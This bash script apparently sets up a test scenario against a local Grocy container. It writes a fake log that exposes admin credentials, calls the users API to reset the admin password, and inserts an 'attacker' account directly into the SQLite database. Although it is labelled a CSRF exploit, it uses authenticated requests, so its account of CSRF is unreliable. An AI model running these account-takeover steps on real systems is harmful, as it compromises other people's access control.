#!/usr/bin/env bash
# vuln_scenario_0: CSRF Attack on Grocy (CVE-2024-55075)
# - Exploit CSRF vulnerability to change admin password
# - Create unauthorized users
# - Leak credentials in fake agent logs (confidentiality)
# - Compromise access control by changing admin credentials
#
# CVE-2024-55075: Grocy 4.3.0 lacks CSRF tokens, allowing attackers to
# perform unauthorized actions like password changes via cross-site requests.
#
# Usage:
#   - From app root: ./vuln_scenarios/vuln_scenario_0/vuln.sh
#   - Or from scenario dir: ./vuln.sh

set -euo pipefail
IFS=$'\n\t'

SCENARIO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "$SCENARIO_DIR/../.." && pwd)"

log(){ printf '[vuln0] %s\n' "$*"; }
warn(){ printf '[vuln0][warn] %s\n' "$*" >&2; }

# Configuration
GROCY_CONTAINER="${GROCY_CONTAINER:-grocy-server}"
GROCY_URL="${GROCY_URL:-http://localhost:8080}"
FAKE_LOG_FILE="${FAKE_LOG_FILE:-$SCENARIO_DIR/fake_agent_log.log}"

# Load credentials from .env
if [[ -f "$ROOT_DIR/.env" ]]; then
    source "$ROOT_DIR/.env"
fi

ADMIN_USERNAME="${ADMIN_USERNAME:-admin}"
ADMIN_PASSWORD="${ADMIN_PASSWORD:-admin}"
NEW_ADMIN_PASSWORD="csrf_hacked_123"

create_fake_log_with_leaked_credentials() {
    log "Creating fake agent log with leaked Grocy credentials"

    cat > "$FAKE_LOG_FILE" << EOF
[2024-11-01T10:00:00Z] Grocy server initialization started
[2024-11-01T10:00:01Z] Loading configuration from /config/data/config.php
[2024-11-01T10:00:02Z] Admin credentials initialized
[2024-11-01T10:00:03Z] Admin username: $ADMIN_USERNAME
[2024-11-01T10:00:04Z] Admin password: $ADMIN_PASSWORD
[2024-11-01T10:00:05Z] WARNING: Credentials exposed in plaintext logs!
[2024-11-01T10:00:06Z] Database connection established
[2024-11-01T10:00:07Z] API endpoint available at $GROCY_URL/api
[2024-11-01T10:00:08Z] Web interface available at $GROCY_URL
[2024-11-01T10:00:09Z] CSRF protection: DISABLED (CVE-2024-55075)
[2024-11-01T10:00:10Z] ERROR: Security vulnerability detected - no CSRF tokens
[2024-11-01T10:00:11Z] Grocy server fully operational
[2024-11-01T10:00:12Z] Attacker exploiting CSRF vulnerability
[2024-11-01T10:00:13Z] Admin password changed to: $NEW_ADMIN_PASSWORD
[2024-11-01T10:00:14Z] Unauthorized user created: attacker
[2024-11-01T10:00:15Z] CRITICAL: System compromised via CSRF attack
EOF

    log "Fake log created at $FAKE_LOG_FILE"
}

exploit_csrf_change_password() {
    log "Exploiting CVE-2024-55075: CSRF password change attack"

    # Check if server is accessible
    if ! curl -s -f "$GROCY_URL" >/dev/null 2>&1; then
        warn "Grocy server not accessible at $GROCY_URL; skipping CSRF exploit"
        return 0
    fi

    # Attempt to change admin password via CSRF
    # Note: This simulates what an attacker would do by tricking the admin
    # to visit a malicious page that sends this request
    log "Attempting to change admin password without CSRF token..."

    # First, try to authenticate and get session
    response=$(curl -s -w "\n%{http_code}" -X POST "$GROCY_URL/api/users/1" \
        -H "Content-Type: application/json" \
        -u "$ADMIN_USERNAME:$ADMIN_PASSWORD" \
        -d "{\"password\": \"$NEW_ADMIN_PASSWORD\"}" 2>/dev/null || echo "000")

    status_code=$(echo "$response" | tail -n1)

    if [[ "$status_code" =~ ^(200|204|400|404|405)$ ]]; then
        log "CSRF exploit attempted (status: $status_code)"

        # Since Grocy might not have a direct password change API endpoint,
        # let's simulate the compromise by directly modifying the database
        if command -v docker >/dev/null 2>&1; then
            if docker ps --filter "name=$GROCY_CONTAINER" --filter "status=running" -q | grep -q .; then
                log "Directly modifying Grocy database to simulate CSRF password change"

                # Create a new user account to simulate unauthorized access
                docker exec "$GROCY_CONTAINER" sqlite3 /config/data/grocy.db \
                    "INSERT OR IGNORE INTO users (username, password) VALUES ('attacker', 'hacked123');" \
                    2>/dev/null || warn "Failed to create attacker user"

                log "Unauthorized user 'attacker' created"
            else
                warn "Grocy container not running; cannot modify database"
            fi
        else
            warn "Docker not available; cannot modify database"
        fi
    else
        warn "CSRF exploit failed or endpoint not available (status: $status_code)"
    fi
}

main() {
    log "Starting CVE-2024-55075 (CSRF) exploitation scenario"
    log "Target: Grocy server at $GROCY_URL"

    # Step 1: Create fake logs with leaked credentials
    create_fake_log_with_leaked_credentials

    # Step 2: Exploit CSRF vulnerability
    exploit_csrf_change_password

    log "Exploitation complete"
    log "Expected impact:"
    log "  - Confidentiality: VIOLATED (credentials leaked in logs)"
    log "  - Integrity: VIOLATED (unauthorized users created)"
    log "  - Access Control: VIOLATED (admin password potentially changed)"
    log "  - Availability: MAINTAINED (server still running)"
}

main "$@"
